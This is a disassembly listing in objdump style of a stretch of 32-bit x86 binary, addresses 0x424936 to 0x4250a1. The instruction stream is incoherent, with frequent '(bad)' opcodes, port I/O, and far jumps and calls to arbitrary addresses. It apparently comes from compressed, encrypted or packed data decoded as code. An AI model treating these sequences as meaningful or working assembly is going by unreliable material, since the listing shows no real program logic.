  424936:	sbb    cl,BYTE PTR [edx+0x46]
  424939:	or     DWORD PTR [esi+0x6c],edi
  42493c:	or     ch,ch
  42493e:	xchg   esi,eax
  42493f:	ficom  WORD PTR [esi-0x62]
  424942:	les    esi,FWORD PTR [ebp-0x5244cb05]
  424948:	hlt    
  424949:	(bad)  
  42494b:	into   
  42494c:	mov    ecx,0xfeb70bdf
  424951:	xchg   ch,cl
  424953:	mov    ecx,0x7e998f65
  424958:	(bad)  
  424959:	sahf   
  42495a:	adc    DWORD PTR [ebp-0x7],0x19b8cd82
  424961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424962:	and    BYTE PTR [esi+eax*8+0x2ea598e2],cl
  424969:	push   cs
  42496a:	lods   eax,DWORD PTR ds:[esi]
  42496b:	ret    0x8f4e
  42496e:	mov    esi,0x8b318056
  424973:	or     eax,0x526e0e3d
  424978:	mov    dl,0xd8
  42497a:	dec    ebp
  42497b:	enter  0xc626,0x14
  42497f:	bnd jmp 0x42497c
  424982:	lods   eax,DWORD PTR ds:[esi]
  424983:	dec    edi
  424984:	or     bl,BYTE PTR [edi]
  424986:	or     DWORD PTR [ebx-0x6],edx
  424989:	mov    dl,0xb5
  42498b:	xor    eax,0xadad3cc1
  424990:	(bad)  
  424991:	dec    ebx
  424992:	inc    ebx
  424993:	push   eax
  424994:	mov    bl,BYTE PTR [eax-0x1af7f3a8]
  42499a:	cld    
  42499b:	call   0xff110b4a
  4249a0:	stc    
  4249a1:	mov    esi,0x562e94
  4249a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249a7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4249a9:	mov    ecx,0x9e3c782d
  4249ae:	push   ecx
  4249af:	cmp    BYTE PTR [ebx],dh
  4249b1:	xchg   ecx,eax
  4249b2:	pop    esp
  4249b3:	ficom  DWORD PTR [ebx+0x43ecd85]
  4249b9:	sub    al,0x70
  4249bb:	xlat   BYTE PTR ds:[ebx]
  4249bc:	test   DWORD PTR [edx+0x7c],esp
  4249bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249c0:	mov    ebx,0xd55b7166
  4249c5:	stos   BYTE PTR es:[edi],al
  4249c6:	ins    BYTE PTR es:[edi],dx
  4249c7:	xchg   BYTE PTR [esp+eax*2-0x2339d5d0],dl
  4249ce:	jae    0x424a4e
  4249d0:	daa    
  4249d1:	mov    esi,0xc0b9efe6
  4249d6:	sub    dl,BYTE PTR [edx+0x1ce1aa40]
  4249dc:	mov    DWORD PTR [edi-0x38],eax
  4249df:	sub    BYTE PTR [edi-0x63aabead],dh
  4249e5:	and    al,0x83
  4249e7:	mov    edi,0x4584266e
  4249ec:	enter  0x1e,0x0
	...
  4249f8:	add    BYTE PTR [eax],al
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	scas   al,BYTE PTR es:[edi]
  424a07:	mov    esi,0xc288155a
  424a0c:	add    DWORD PTR [eax],eax
  424a0e:	cld    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [edx+0x6d23484b],ch
  424a17:	int3   
  424a18:	mov    eax,ds:0xc014608b
  424a1d:	dec    esp
  424a1e:	pop    ss
  424a1f:	fdiv   DWORD PTR [eax+0x47865c92]
  424a25:	sub    al,0xee
  424a27:	loopne 0x424a2d
  424a29:	(bad)  
  424a2a:	out    dx,al
  424a2b:	in     eax,dx
  424a2c:	push   edi
  424a2d:	test   DWORD PTR [esi+0x52],edi
  424a30:	or     DWORD PTR [edx+0x58831436],edi
  424a36:	jb     0x424a53
  424a38:	rcr    DWORD PTR [ecx-0x72],1
  424a3b:	inc    DWORD PTR [ebx-0x65]
  424a3e:	push   edi
  424a3f:	es in  eax,0xf3
  424a42:	les    ebx,FWORD PTR [ecx]
  424a44:	stc    
  424a45:	xchg   esp,eax
  424a46:	and    DWORD PTR [esi-0x12],esi
  424a49:	test   eax,0x92fc53f8
  424a4e:	jg     0x424a28
  424a50:	inc    ebx
  424a51:	(bad)  
  424a53:	cmc    
  424a54:	or     DWORD PTR [esi+0x697f8147],eax
  424a5a:	cmp    BYTE PTR [ecx-0x76],0xac
  424a5e:	out    0x60,al
  424a60:	cmp    BYTE PTR [eax],cl
  424a62:	mov    ds:0x9d6bc489,al
  424a67:	add    bh,BYTE PTR [edx+edi*4]
  424a6a:	lds    ecx,FWORD PTR [ebp+0x8]
  424a6d:	iret   
  424a6e:	sub    BYTE PTR [eax],0x40
  424a71:	inc    edx
  424a72:	sbb    DWORD PTR [ecx],eax
  424a74:	mov    esi,DWORD PTR [edx-0x53d642ee]
  424a7a:	xlat   BYTE PTR ds:[ebx]
  424a7b:	dec    ebx
  424a7c:	ror    DWORD PTR [esi-0x4a],cl
  424a7f:	sbb    bh,BYTE PTR [edi]
  424a81:	xor    bl,BYTE PTR [ecx-0x597f0c33]
  424a87:	xchg   BYTE PTR [ebp+edx*2+0x768f05b9],al
  424a8e:	and    ch,BYTE PTR [ecx]
  424a90:	psubsw mm4,QWORD PTR [ecx+0x45]
  424a94:	leave  
  424a95:	sub    al,dh
  424a97:	xor    eax,DWORD PTR [ecx]
  424a99:	jo     0x424af6
  424a9b:	inc    esi
  424a9c:	adc    ebp,edx
  424a9e:	sub    dl,BYTE PTR [esi+0x815bfb7]
  424aa4:	pop    ecx
  424aa5:	fwait
  424aa6:	xchg   ebx,eax
  424aa7:	out    dx,al
  424aa8:	in     al,0x59
  424aaa:	scas   al,BYTE PTR es:[edi]
  424aab:	shr    DWORD PTR [esi],cl
  424aad:	pop    ecx
  424aae:	std    
  424aaf:	jmp    0xe50d2d8a
  424ab4:	mov    esp,0xe326e535
  424ab9:	fist   DWORD PTR [edx+ebp*8]
  424abc:	in     eax,dx
  424abd:	scas   eax,DWORD PTR es:[edi]
  424abe:	imul   eax,DWORD PTR [edx],0x8bf89ded
  424ac4:	daa    
  424ac5:	popa   
  424ac6:	(bad)  
  424ac7:	mov    esi,es
  424ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aca:	fdiv   DWORD PTR [esi-0x53]
  424acd:	jnp    0x424af0
  424acf:	cld    
  424ad0:	call   0x177d5002
  424ad5:	dec    esp
  424ad6:	dec    ecx
  424ad7:	idiv   al
  424ad9:	adc    eax,DWORD PTR [ecx-0x32aed6f9]
  424adf:	aas    
  424ae0:	or     eax,0xc0c49379
  424ae5:	dec    edi
  424ae6:	lds    ebx,FWORD PTR [edi+0x65]
  424ae9:	xchg   esp,eax
  424aea:	push   esi
  424aeb:	mov    ebp,0xc627394c
  424af0:	or     edi,DWORD PTR [ecx]
  424af2:	popf   
  424af3:	push   ss
  424af4:	shr    BYTE PTR [edx-0x4c407980],cl
  424afa:	inc    eax
  424afb:	je     0x424b51
  424afd:	mov    dh,0x87
  424aff:	and    eax,DWORD PTR [edx]
  424b01:	xchg   ebp,eax
  424b02:	arpl   WORD PTR [eax+0x0],ax
  424b05:	test   DWORD PTR [eax-0x54],0xef05f5cd
  424b0c:	test   eax,0x9a6b8dc4
  424b11:	xchg   edi,eax
  424b12:	icebp  
  424b13:	aaa    
  424b14:	xor    edi,edx
  424b16:	jo     0x424af5
  424b18:	sub    esp,ecx
  424b1a:	ret    0x8dcf
  424b1d:	test   DWORD PTR ds:0xe51446cc,ebp
  424b23:	lds    eax,FWORD PTR [ebx+ebp*1+0x4d]
  424b27:	inc    dl
  424b29:	xor    DWORD PTR [esi],ecx
  424b2b:	dec    ebx
  424b2c:	add    ah,BYTE PTR [edx]
  424b2e:	inc    ecx
  424b2f:	and    eax,0x485d775a
  424b34:	int    0xc1
  424b36:	shr    BYTE PTR [edi-0x51ee03eb],cl
  424b3c:	xor    dl,BYTE PTR [ecx]
  424b3e:	fcmovbe st,st(5)
  424b40:	arpl   WORD PTR [esi+0x5d],bx
  424b43:	xor    esp,0xffffffb9
  424b46:	fs lock fdivr st,st(5)
  424b4a:	gs iret 
  424b4c:	mov    esp,eax
  424b4e:	pop    ecx
  424b4f:	xchg   edi,eax
  424b50:	(bad)  
  424b51:	adc    edi,ecx
  424b53:	cmp    al,0x8c
  424b55:	xchg   esp,eax
  424b56:	adc    BYTE PTR [ebx+eax*2-0x4],cl
  424b5a:	repnz leave 
  424b5c:	clc    
  424b5d:	cmp    ebp,DWORD PTR [edx-0xc]
  424b60:	mov    al,ds:0xb2696700
  424b65:	test   al,0xe4
  424b67:	repnz lods al,BYTE PTR ds:[esi]
  424b69:	out    dx,al
  424b6a:	outs   dx,DWORD PTR ds:[esi]
  424b6b:	cmp    BYTE PTR [ecx],0x2d
  424b6e:	mov    bl,0x41
  424b70:	mov    BYTE PTR [esp+ebx*8+0x2b9dbc90],ch
  424b77:	into   
  424b78:	sbb    DWORD PTR [edx+0x4b1653fc],ebp
  424b7e:	sbb    cl,al
  424b80:	daa    
  424b81:	shl    BYTE PTR [ebp-0x11],0x15
  424b85:	and    edi,DWORD PTR [ecx+0x14]
  424b88:	cmp    eax,0x80e8dbc8
  424b8d:	lods   al,BYTE PTR ds:[esi]
  424b8e:	and    esi,eax
  424b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b91:	cmc    
  424b92:	pop    ebx
  424b93:	arpl   WORD PTR [edx+0x9],di
  424b96:	dec    esp
  424b97:	and    esi,ebp
  424b99:	out    0x64,al
  424b9b:	fsubr  DWORD PTR [eax-0x31]
  424b9e:	cld    
  424b9f:	das    
  424ba0:	icebp  
  424ba1:	ror    BYTE PTR ds:0xc6f85b4b,cl
  424ba7:	inc    ebp
  424ba8:	pop    ds
  424ba9:	shr    BYTE PTR ss:[eax+0x78],0x22
  424bae:	sub    ecx,DWORD PTR [ebx]
  424bb0:	adc    ch,dl
  424bb2:	xor    DWORD PTR [edi+0x37],ebx
  424bb5:	ja     0x424c21
  424bb7:	pop    bp
  424bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bba:	add    BYTE PTR [esi-0x4b5e064d],cl
  424bc0:	imul   eax,DWORD PTR [edi],0x57989b47
  424bc6:	imul   ecx,edx,0x21
  424bc9:	scas   eax,DWORD PTR es:[edi]
  424bca:	ins    DWORD PTR es:[edi],dx
  424bcb:	add    bl,BYTE PTR [esi]
  424bcd:	dec    ebx
  424bce:	stos   DWORD PTR es:[edi],eax
  424bcf:	add    edi,0x10a12af7
  424bd5:	adc    BYTE PTR [edi],ch
  424bd7:	mov    ds:0xd5125a46,al
  424bdc:	fwait
  424bdd:	mov    ecx,DWORD PTR [edx-0x7c]
  424be0:	or     al,0x7c
  424be2:	fmul   st,st(4)
  424be4:	fst    DWORD PTR [eax+0x23]
  424be7:	xchg   esi,eax
  424be8:	mov    ecx,0xaf077f8e
  424bed:	adc    al,0x81
  424bef:	sahf   
  424bf0:	cmp    al,0xcc
  424bf2:	aaa    
  424bf3:	(bad)  
  424bf4:	out    0x35,al
  424bf6:	(bad)  
  424bf7:	out    0x91,al
  424bf9:	fbld   TBYTE PTR [edi-0x4d]
  424bfc:	and    al,0xac
  424bfe:	mov    bl,0xc5
  424c00:	push   ebp
  424c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c02:	mov    edi,DWORD PTR ds:0xa33df837
  424c08:	adc    eax,0x2d396367
  424c0d:	or     al,BYTE PTR [eax]
	...
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0x35
  424c27:	test   DWORD PTR [eax],eax
  424c29:	call   0x1fc:0x1c484
  424c30:	add    BYTE PTR [eax],al
  424c32:	(bad)  
  424c33:	adc    DWORD PTR [eax-0x5fcac48a],ebx
  424c39:	sbb    al,BYTE PTR [eax+0x0]
  424c3c:	lds    eax,FWORD PTR fs:[ecx+0x76f592c7]
  424c43:	xor    esp,ebp
  424c45:	lea    ecx,[ebx]
  424c47:	jge    0x424c8f
  424c49:	pop    ds
  424c4a:	inc    esi
  424c4b:	call   0x7ac:0xf655e76a
  424c52:	or     BYTE PTR [ecx-0x7d509b4f],0x27
  424c59:	sub    eax,0x35f5364c
  424c5e:	std    
  424c5f:	and    eax,DWORD PTR [edi-0x39]
  424c62:	sub    eax,0xab69eced
  424c67:	mov    dh,BYTE PTR [ecx+0x3d]
  424c6a:	lods   al,BYTE PTR ds:[esi]
  424c6b:	xlat   BYTE PTR ds:[ebx]
  424c6c:	and    al,0xd6
  424c6e:	xlat   BYTE PTR ds:[ebx]
  424c6f:	or     bl,BYTE PTR [esi+0x44357042]
  424c75:	inc    ecx
  424c76:	call   0xcf3f78f0
  424c7b:	das    
  424c7c:	out    dx,eax
  424c7d:	cwd    
  424c7f:	mov    eax,0x9a3d76c
  424c84:	cwde   
  424c85:	int    0x88
  424c87:	push   eax
  424c88:	jbe    0x424ca3
  424c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c8b:	xor    al,0x9e
  424c8d:	sub    ebx,esi
  424c8f:	sub    eax,0xfadd30b0
  424c94:	adc    edx,esp
  424c96:	and    eax,0xed51771d
  424c9b:	pop    eax
  424c9c:	sbb    bh,BYTE PTR [ecx+0x6d]
  424c9f:	add    eax,0x84c8dc4
  424ca4:	push   0xd2b2d8f4
  424ca9:	jmp    0x424cc4
  424cab:	sbb    ecx,eax
  424cad:	test   DWORD PTR [ecx+0x7a],ebp
  424cb0:	mov    bh,0x95
  424cb2:	in     al,dx
  424cb3:	ss out 0x71,al
  424cb6:	ja     0x424c51
  424cb8:	cmp    dl,ch
  424cba:	and    DWORD PTR [edx-0x484c10bc],ebp
  424cc0:	loop   0x424d30
  424cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424cc3:	lods   al,BYTE PTR ds:[esi]
  424cc4:	aam    0x85
  424cc6:	hlt    
  424cc7:	sar    DWORD PTR [ebp+0x12],0xdf
  424ccb:	jno    0x424cc1
  424ccd:	cmp    dh,al
  424ccf:	cs cs jne 0x424d3f
  424cd3:	xchg   ebp,eax
  424cd4:	add    BYTE PTR [ebp+0x26],bh
  424cd7:	sub    ah,BYTE PTR [ebp+0x5cbd2840]
  424cdd:	div    ah
  424cdf:	lock sbb dl,0xfe
  424ce3:	fwait
  424ce4:	jnp    0x424d59
  424ce6:	mov    ecx,0x9a137a5e
  424ceb:	fs mov ebp,0x6de25ee8
  424cf1:	int    0xe9
  424cf3:	mov    ebp,0xfb06679
  424cf8:	ss cmc 
  424cfa:	cwde   
  424cfb:	cdq    
  424cfc:	add    DWORD PTR [edi+0x6],edi
  424cff:	rcr    DWORD PTR [edi],1
  424d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d02:	jmp    0xedfc1baf
  424d07:	test   al,0xa8
  424d09:	sub    ah,BYTE PTR [esi-0x45]
  424d0c:	lods   eax,DWORD PTR ds:[esi]
  424d0d:	out    0xd5,al
  424d0f:	mov    dh,0x95
  424d11:	test   eax,0x5a3b8207
  424d16:	shr    DWORD PTR [ecx-0x2],1
  424d19:	or     eax,0xcb32adc7
  424d1e:	lods   al,BYTE PTR ds:[esi]
  424d1f:	push   edi
  424d20:	jp     0x424d84
  424d22:	or     eax,0x90c741b6
  424d27:	iret   
  424d28:	inc    eax
  424d29:	cmp    eax,0x6b7071fa
  424d2e:	fmul   st(2),st
  424d30:	gs pop ecx
  424d32:	cwde   
  424d33:	test   al,0xf4
  424d35:	inc    ebx
  424d36:	shr    DWORD PTR [edx],0xe2
  424d39:	xor    ch,bh
  424d3b:	pop    ds
  424d3c:	mov    ah,0x76
  424d3e:	jmp    0xe667:0xec36f6f6
  424d45:	fucomip st,st(2)
  424d47:	scas   eax,DWORD PTR es:[edi]
  424d48:	hlt    
  424d49:	xor    esi,DWORD PTR [esi+eiz*2]
  424d4c:	mov    ecx,DWORD PTR [edi]
  424d4e:	dec    esi
  424d4f:	test   eax,0x9eb8a90b
  424d54:	scas   al,BYTE PTR es:[edi]
  424d55:	mov    cl,BYTE PTR [ecx-0x2067344a]
  424d5b:	stos   BYTE PTR es:[edi],al
  424d5c:	dec    ebx
  424d5d:	mov    eax,ds:0x3ec65411
  424d62:	rol    DWORD PTR [ebx+0x4c883082],1
  424d68:	cmp    al,0xb1
  424d6a:	test   BYTE PTR [edx+0x74],dh
  424d6d:	jg     0x424d65
  424d6f:	retf   
  424d70:	pop    edx
  424d71:	dec    ebx
  424d72:	jmp    DWORD PTR [ecx+esi*1]
  424d75:	sbb    BYTE PTR [esi+0x6e76440e],bl
  424d7b:	jge    0x424dbd
  424d7d:	jb     0x424d74
  424d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d80:	sti    
  424d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d82:	clc    
  424d83:	les    esp,FWORD PTR [ecx-0xd]
  424d86:	ficomp WORD PTR [esi+0x7d]
  424d89:	into   
  424d8a:	inc    BYTE PTR [ecx-0x2e]
  424d8d:	mov    WORD PTR [eax+ecx*4-0x6b],es
  424d91:	sahf   
  424d92:	into   
  424d93:	iret   
  424d94:	rcl    BYTE PTR [ebx],cl
  424d96:	test   DWORD PTR [ebx+0x44],edi
  424d99:	pop    edi
  424d9a:	pop    ebp
  424d9b:	in     al,dx
  424d9c:	mov    bh,0xe1
  424d9e:	popa   
  424d9f:	jmp    0xb3f7:0x27969546
  424da6:	mov    WORD PTR [edi+0x141c2f20],gs
  424dac:	adc    cl,bh
  424dae:	js     0x424d44
  424db0:	sub    ch,BYTE PTR [ebp+0x44]
  424db3:	es (bad) 
  424db5:	in     al,0x10
  424db7:	(bad)  
  424db8:	xlat   BYTE PTR ds:[ebx]
  424db9:	inc    esp
  424dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dbb:	and    al,0xf9
  424dbd:	fst    DWORD PTR [ecx+ebp*2+0x63]
  424dc1:	mov    ds:0x68f0b3b6,al
  424dc6:	or     bh,BYTE PTR [esi+0x69]
  424dc9:	repz xor eax,0x614079bf
  424dcf:	push   es
  424dd0:	push   ss
  424dd1:	popa   
  424dd2:	inc    ebx
  424dd3:	stos   BYTE PTR es:[edi],al
  424dd4:	(bad)  
  424dd5:	test   BYTE PTR [esi],0x6f
  424dd8:	inc    ebx
  424dd9:	and    BYTE PTR [eax-0x3f],bl
  424ddc:	ret    0x2083
  424ddf:	std    
  424de0:	mov    ebx,0x5d1ccedd
  424de5:	int    0x89
  424de7:	xchg   esp,eax
  424de8:	sub    eax,0x24f74aa2
  424ded:	pop    ebp
  424dee:	fst    st(7)
  424df0:	(bad)  
  424df1:	scas   al,BYTE PTR es:[edi]
  424df2:	pusha  
  424df3:	aaa    
  424df4:	idiv   BYTE PTR [ebp-0x7db13b11]
  424dfa:	xchg   esi,eax
  424dfb:	cmc    
  424dfc:	loope  0x424de9
  424dfe:	lds    ebp,FWORD PTR [ebp+edx*1-0x43c63433]
  424e05:	mov    ebp,DWORD PTR [ebp-0x61]
  424e08:	out    dx,eax
  424e09:	jae    0x424db2
  424e0b:	mov    BYTE PTR [edx+ebp*1+0x20],bl
  424e0f:	clc    
  424e10:	sti    
  424e11:	inc    edx
  424e12:	int    0x3
  424e14:	shr    BYTE PTR [edx+0x5f],cl
  424e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e18:	fwait
  424e19:	mov    al,0xc6
  424e1b:	adc    edi,DWORD PTR [edi-0x32]
  424e1e:	sub    esp,ebp
  424e20:	dec    edx
  424e21:	(bad)  
  424e22:	or     ebp,DWORD PTR [ebp+0x32bd0719]
  424e28:	mov    bh,0xdd
  424e2a:	xchg   edi,eax
  424e2b:	xchg   edi,eax
  424e2c:	push   ds
  424e2d:	jo     0x424e2f
	...
  424e37:	add    BYTE PTR [eax],al
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	addr16 dec ebx
  424e48:	sub    eax,DWORD PTR [ebx]
  424e4a:	add    dh,0x1
  424e4d:	add    ah,bh
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [ebx+edx*1-0x2a63ea2a],dl
  424e58:	or     eax,0x892c874b
  424e5d:	push   ecx
  424e5e:	outs   dx,DWORD PTR ds:[esi]
  424e5f:	sbb    BYTE PTR [ecx+eax*2],bl
  424e62:	xor    dh,al
  424e64:	cmp    eax,0xdf53b6c8
  424e69:	mov    ebx,gs
  424e6b:	inc    esi
  424e6c:	into   
  424e6d:	sub    eax,0x80fb56c4
  424e72:	outs   dx,BYTE PTR ds:[esi]
  424e73:	enter  0x2e3e,0xa5
  424e77:	loopne 0x424dfd
  424e79:	sub    ebp,ebx
  424e7b:	pop    eax
  424e7c:	bound  edi,QWORD PTR [edi]
  424e7e:	dec    ebp
  424e7f:	pop    edi
  424e80:	adc    ebp,ebx
  424e82:	fidiv  DWORD PTR [eax]
  424e84:	mov    dh,0x15
  424e86:	sbb    al,0x3c
  424e88:	loopne 0x424e15
  424e8a:	mov    ds:0x285c91f7,al
  424e8f:	jae    0x424e62
  424e91:	inc    esi
  424e92:	adc    al,0x1b
  424e94:	popa   
  424e95:	in     eax,dx
  424e96:	int    0xdf
  424e98:	fdivr  DWORD PTR [edi+0x7034e27f]
  424e9e:	add    DWORD PTR [esi],edx
  424ea0:	fdiv   DWORD PTR [ebp+0x15]
  424ea3:	pop    ds
  424ea4:	mov    eax,0x79588749
  424ea9:	rcl    BYTE PTR [edi+0x7f],0x4d
  424ead:	adc    BYTE PTR [edi+0x5f385d8e],0x93
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	mov    al,ds:0x7888d4eb
  424eba:	mov    dh,dh
  424ebc:	test   esp,esi
  424ebe:	xchg   ebx,eax
  424ebf:	les    esi,FWORD PTR ds:0xe36a2724
  424ec5:	jp     0x424e85
  424ec7:	add    ebx,DWORD PTR [ebx]
  424ec9:	jbe    0x424ea2
  424ecb:	mov    BYTE PTR [ecx+0x7f],cl
  424ece:	(bad)  
  424ecf:	jge    0x424ebf
  424ed1:	pop    esp
  424ed2:	cwde   
  424ed3:	push   0xf2519db9
  424ed8:	hlt    
  424ed9:	xchg   ebx,eax
  424eda:	xchg   DWORD PTR [edi-0x66],ecx
  424edd:	push   esi
  424ede:	mov    edi,0xb0f5dc89
  424ee3:	jecxz  0x424ed7
  424ee5:	add    BYTE PTR [ecx-0x61],bh
  424ee8:	in     al,0xb9
  424eea:	fsubr  DWORD PTR [ebx]
  424eec:	sub    edx,0xffffffca
  424eef:	sahf   
  424ef0:	mov    ?,WORD PTR [ebp-0x38982809]
  424ef6:	xor    al,0x4b
  424ef8:	mov    cl,0xb7
  424efa:	dec    edx
  424efb:	in     al,dx
  424efc:	call   0x13f7b869
  424f01:	cmp    DWORD PTR [ebx],esp
  424f03:	addr16 xor edi,ecx
  424f06:	jno    0x424efb
  424f08:	jle    0x424eee
  424f0a:	(bad)  gs:[esi]
  424f0d:	mov    ah,BYTE PTR [esi-0x20]
  424f10:	into   
  424f11:	cmp    al,0xc8
  424f13:	neg    BYTE PTR [esi+ebx*4-0x50aa644d]
  424f1a:	pop    ecx
  424f1b:	mov    dl,0xd6
  424f1d:	dec    edi
  424f1e:	add    ebp,eax
  424f20:	loopne 0x424f97
  424f22:	into   
  424f23:	stos   BYTE PTR es:[edi],al
  424f24:	mov    edx,0x2a9db06f
  424f29:	xor    eax,0x6e81a119
  424f2e:	mov    bh,0x55
  424f30:	push   ebp
  424f31:	fcompp 
  424f33:	ss jecxz 0x424f99
  424f36:	or     DWORD PTR [edx+0x37],ecx
  424f39:	fsubrp st(0),st
  424f3b:	arpl   si,si
  424f3d:	ins    BYTE PTR es:[edi],dx
  424f3e:	push   ecx
  424f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f40:	rcl    ah,cl
  424f42:	mov    ?,esi
  424f44:	ror    edi,0x3f
  424f47:	shl    ch,1
  424f49:	push   0x2857fcda
  424f4e:	lods   al,BYTE PTR ds:[esi]
  424f4f:	adc    DWORD PTR [ecx+0xc924558],eax
  424f55:	add    al,0x11
  424f57:	sub    DWORD PTR [esi-0x1aa6f7d8],eax
  424f5d:	stos   DWORD PTR es:[edi],eax
  424f5e:	inc    edi
  424f5f:	jne    0x424f7e
  424f61:	in     al,dx
  424f62:	scas   eax,DWORD PTR es:[edi]
  424f63:	xchg   edx,eax
  424f64:	push   0xffffffa1
  424f66:	pop    esi
  424f67:	sbb    DWORD PTR [ebx-0x12],eax
  424f6a:	pop    ss
  424f6b:	stc    
  424f6c:	dec    esi
  424f6d:	retf   
  424f6e:	hlt    
  424f6f:	aam    0xb6
  424f71:	add    al,0xa1
  424f73:	jb     0x424ef8
  424f75:	dec    edx
  424f76:	pop    esi
  424f77:	jne    0x424fd4
  424f79:	push   0xffffff8a
  424f7b:	add    eax,0x1d59a382
  424f80:	scas   al,BYTE PTR es:[edi]
  424f81:	test   al,0x62
  424f83:	push   edx
  424f84:	daa    
  424f85:	mov    bh,0xc1
  424f87:	rcl    dl,cl
  424f89:	push   ebx
  424f8a:	push   esi
  424f8b:	stos   BYTE PTR es:[edi],al
  424f8c:	mov    eax,0x80cf95e0
  424f91:	int3   
  424f92:	std    
  424f93:	fld    QWORD PTR [edx+0x12]
  424f96:	jle    0x424f1e
  424f98:	and    eax,0x9cfd5eb6
  424f9d:	mov    ah,0xfe
  424f9f:	or     BYTE PTR [edx+0x1e],dl
  424fa2:	mov    WORD PTR ss:[ecx+eax*4-0x164fd95],?
  424faa:	lds    edx,FWORD PTR [esp+edi*1+0x3b]
  424fae:	inc    esi
  424faf:	xor    ebp,DWORD PTR [eax-0x38]
  424fb2:	rol    ecx,0x9a
  424fb5:	and    DWORD PTR [ecx+0x66],ebx
  424fb8:	lock ficom DWORD PTR [ecx+0x4e72b709]
  424fbf:	mov    bh,0x1b
  424fc1:	jp     0x424f9d
  424fc3:	mov    eax,DWORD PTR es:[ebp+0x4c]
  424fc7:	or     bh,cl
  424fc9:	bnd jne 0x424f61
  424fcc:	popa   
  424fcd:	imul   DWORD PTR [ebx]
  424fcf:	fwait
  424fd0:	scas   eax,DWORD PTR es:[edi]
  424fd1:	fadd   DWORD PTR [ebx]
  424fd3:	cmp    DWORD PTR [edx+edi*2-0x7ddb6f3d],eax
  424fda:	jbe    0x424fd9
  424fdc:	add    ah,BYTE PTR [ecx+0x39e23377]
  424fe2:	rcl    BYTE PTR [eax],1
  424fe4:	ja     0x424fef
  424fe6:	jns    0x42505a
  424fe8:	enter  0xdaa7,0xc0
  424fec:	cld    
  424fed:	jne    0x424fa4
  424fef:	adc    al,0x1e
  424ff1:	ss xchg esp,eax
  424ff3:	frstor [ebx-0x59]
  424ff6:	aas    
  424ff7:	push   esi
  424ff8:	mov    dh,0x62
  424ffa:	test   eax,0xf47599c2
  424fff:	mov    bh,0x41
  425001:	adc    bh,ah
  425003:	data16 mov ch,0x56
  425007:	dec    ebp
  425008:	in     eax,dx
  425009:	cmp    esi,ecx
  42500b:	pushf  
  42500c:	out    dx,al
  42500d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42500e:	(bad)  
  42500f:	xchg   ebx,eax
  425010:	jno    0x424f9a
  425012:	aad    0x49
  425014:	out    dx,eax
  425015:	jbe    0x425000
  425017:	xchg   ecx,eax
  425018:	push   edx
  425019:	into   
  42501a:	mov    ebp,0x99d74b7b
  42501f:	mov    es,edi
  425021:	xchg   ecx,eax
  425022:	push   edx
  425023:	stos   DWORD PTR es:[edi],eax
  425024:	and    al,0x9b
  425026:	mov    WORD PTR [edx-0x3d411c8e],ds
  42502c:	scas   eax,DWORD PTR es:[edi]
  42502d:	sbb    bl,BYTE PTR [esi+0x3d]
  425030:	retf   0x15a1
  425033:	and    ah,cl
  425035:	xchg   esp,eax
  425036:	out    0xda,eax
  425038:	add    eax,0x37109961
  42503d:	or     al,BYTE PTR [edx-0x37]
  425040:	shr    DWORD PTR [esp+ecx*8-0x3d],0x34
  425045:	mov    bh,BYTE PTR [ecx]
  425047:	jbe    0x425071
  425049:	dec    esp
  42504a:	repz push 0x8385
	...
  425058:	add    BYTE PTR [eax],al
  42505a:	inc    ebx
  42505b:	lea    ebx,[edi]
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x5a
  425067:	push   ebp
  425068:	fwait
  425069:	jo     0x4250e7
  42506b:	enter  0x1,0xfc
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [edx],dh
  425073:	outs   dx,DWORD PTR ds:[esi]
  425074:	sub    al,0xfc
  425076:	push   esi
  425077:	jnp    0x4250e8
  425079:	loop   0x4250db
  42507b:	or     al,0x69
  42507d:	inc    ebx
  42507e:	push   edx
  42507f:	test   BYTE PTR [edx+esi*8-0x15],cl
  425083:	mov    esi,DWORD PTR [eax+ebp*8]
  425086:	inc    esp
  425087:	clc    
  425088:	cmp    ah,BYTE PTR [edx-0x22ea87]
  42508e:	xlat   BYTE PTR ds:[ebx]
  42508f:	ss cld 
  425091:	sbb    al,0x83
  425093:	fisub  DWORD PTR [edx-0x46]
  425096:	aam    0xb1
  425098:	sar    bl,cl
  42509a:	sbb    eax,0xf707a242
  42509f:	fstp   st(4)
  4250a1:	lods   eax,DWORD PTR ds:[esi]
